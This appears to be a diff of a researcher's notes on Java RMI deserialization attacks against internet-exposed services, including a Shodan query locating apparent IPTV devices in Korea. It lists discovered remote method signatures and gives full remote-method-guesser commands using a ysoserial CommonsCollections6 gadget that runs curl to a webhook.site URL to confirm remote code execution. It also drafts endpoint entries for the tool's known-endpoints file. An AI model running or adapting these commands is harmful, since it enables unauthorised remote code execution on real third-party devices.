@@ -4,6 +4,8 @@ most of 1099 port exposed on the internet expose jmxrmi, the exploitation is str
 
 and here we are, looking for methods in random package with rmg https://github.com/qtc-de/remote-method-guesser on rmi exposed on internet, i'll try to describe those which i manage to get an actual RCE gadget (URLDNS is cool but for test only)
 
+
+1-------------------------------------------------------------------------------------------------------------------------------------------------
 https://www.shodan.io/search?query=http.html_hash%3A516997337 (only few hosts on korea, device seems to be an IPTV)
 
 IDataObject
@@ -15,7 +17,7 @@ String login(String dummy, String dummy2)
 String logout(String dummy)
 
 
-java -jar rmg-5.1.0-jar-with-dependencies.jar serialxxx 1099 CommonsCollections6 'curl -X POST http://webhook.site/xx/' --signature 'String register(String dummy, String dummy2)' --bound-name IDataObject --yso /root/Desktop/yso/ysoserial-all.jar
+java -jar rmg-5.1.0-jar-with-dependencies.jar serial xxx 1099 CommonsCollections6 'curl -X POST http://webhook.site/xx/' --signature 'String register(String dummy, String dummy2)' --bound-name IDataObject --yso /root/Desktop/yso/ysoserial-all.jar
 
 
 --------------------------------------------- to RMG remote-method-guesser/resources/known-endpoints/known-endpoints.yml (https://github.com/qtc-de/remote-method-guesser/blob/3398ec6abc0af18c71c1f90b0c85702469eabf75/resources/known-endpoints/known-endpoints.yml)
@@ -27,7 +29,6 @@ java -jar rmg-5.1.0-jar-with-dependencies.jar serialxxx 1099 CommonsCollections6
   description: |
     stuff
     
-
   remoteMethods:
     - String register(String dummy, String dummy2)
     - String login(String dummy, String dummy2)
@@ -40,3 +41,38 @@ java -jar rmg-5.1.0-jar-with-dependencies.jar serialxxx 1099 CommonsCollections6
         Several methods accept non trivial parameters and can therefore be used for deserialization attacks.
       references:
         - https://github.com/qtc-de/remote-method-guesser#serial
+
+
+2-------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+com.dynamicsoft.DsLibs.mgmt.statistics.StatController
+com.dynamicsoft.DsLibs.mgmt.statistics.StatController
+
+method discovered :
+boolean reset(String dummy)
+boolean reset(String dummy, String dummy2[])
+
+
+java -jar rmg-5.1.0-jar-with-dependencies.jar serial xxxx 1099 CommonsCollections6 "curl https://webhook.site/xxx" --signature 'boolean reset(String dummy)' --yso /root/Desktop/yso/ysoserial-all.jar --bound-name "com.dynamicsoft.DsLibs.mgmt.statistics.StatController"
+
+
+- name: Dynamicsoft MGMT StatController
+  className:
+    - com.dynamicsoft.DsLibs.mgmt.statistics.StatController
+  description: |
+    stuff
+    
+  remoteMethods:
+    - boolean reset(String dummy)
+    - boolean reset(String dummy, String dummy2[])
+
+  vulnerabilities:
+ 
+    - name: Deserialization
+      description: |
+        Several methods accept non trivial parameters and can therefore be used for deserialization attacks.
+      references:
+        - https://github.com/qtc-de/remote-method-guesser#serial
+
